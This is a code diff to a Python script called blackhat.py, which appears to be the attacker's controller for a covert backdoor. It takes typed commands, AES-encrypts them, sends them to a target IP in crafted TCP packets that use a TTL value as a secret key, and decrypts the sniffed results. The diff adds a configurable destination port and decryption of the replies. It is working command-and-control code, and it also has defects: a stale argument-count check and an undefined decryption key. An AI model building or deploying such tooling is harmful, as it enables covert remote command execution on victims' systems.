@@ -35,6 +35,7 @@ global sourcePort
 global ttlKey
 global encryptionKey
 global IV
+global dstPort
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 --  FUNCTION
@@ -53,8 +54,9 @@ def usage():
     global ttlKey
     global encryptionKey
     global IV
+    global dstPort
     if len(sys.argv) < 5:
-        print "Please use format python blackhat.py <targetIP> <sourcePort> <ttlKey> <encryptionKey> <IV>"
+        print "Please use format python blackhat.py <targetIP> <sourcePort> <dstPort> <ttlKey> <encryptionKey> <IV>"
         sys.exit()
     else:
         if len(sys.argv[4]) < 16:
@@ -68,11 +70,13 @@ def usage():
         global sourcePort
         sourcePort = sys.argv[2]
         print "START Sending from Blackhat port: %s"%(sourcePort)
-        ttlKey = int(sys.argv[3])
+        dstPort = sys.argv[3]
+        print "Send to destination port: " + str(dstPort)
+        ttlKey = int(sys.argv[4])
         print "TTL Key is " + str(ttlKey)
-        encryptionKey = sys.argv[4]
+        encryptionKey = sys.argv[5]
         print "Encryption key is " + encryptionKey
-        IV = sys.argv[5]
+        IV = sys.argv[6]
         print "IV is " + IV
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
@@ -96,6 +100,29 @@ def encryptCommand(command):
     # IV = "abcdefghijklmnop"
     encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
     return encryptor.encrypt(command)
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+--  FUNCTION
+--  Name:       decryptCommand
+--  Parameters:
+--     String
+--      The encrypted command contained in the packet payload.
+--  Return Values:
+--      String
+--          The decrypted plain text command contained in the packet payload.
+--  Description:
+--      The function takes the encrypted command contained in the packet payload
+--      and decrypts is using the same key and IV used at the attackers system.
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+def decryptCommand(command):
+    global decryptionKey
+    decryptionKey = decryptionKey
+    print "decryptionKey is " + decryptionKey
+    global IV
+    IV = IV
+    decryptor = AES.new(decryptionKey, AES.MODE_CFB, IV=IV)
+    plain = decryptor.decrypt(command)
+    return plain
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 --  FUNCTION
@@ -133,11 +160,12 @@ def craftCommandPacket(command):
     global targetIP
     global sourcePort
     global ttlKey
+    global dstPort
 
     #TODO:
     # data = encryptMessage(command)
     data = command
-    packet = (IP(dst=targetIP,ttl=ttlKey)/TCP(sport=int(sourcePort),dport=80)/ data)
+    packet = (IP(dst=targetIP,ttl=ttlKey)/TCP(sport=int(sourcePort),dport=dstPort)/ data)
     return packet
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
@@ -162,7 +190,7 @@ def commandResult(packet):
         ttl = packet[IP].ttl
         # Part of the key that signifies that this packet is for us (TTL = 71)
         if srcIP == targetIP and ttl == ttlKey:
-            print packet.load
+            print decryptCommand(packet.load)
             return True
         else:
             return False
@@ -173,6 +201,7 @@ def commandResult(packet):
 
 if __name__ == "__main__":
     usage()
+    global dstPort
     # Go into the send/receive loop
     while True:
         command = raw_input("ENTER COMMAND -> " + targetIP + ":")
@@ -182,4 +211,4 @@ if __name__ == "__main__":
             sendCommand(encryptCommand(command))
             global sourcePort
             print sourcePort
-            sniff(timeout=1, filter="tcp and dst port " + sourcePort + " and src port 80", stop_filter=commandResult)
+            sniff(timeout=1, filter="tcp and dst port " + sourcePort + " and src port " + dstPort, stop_filter=commandResult)
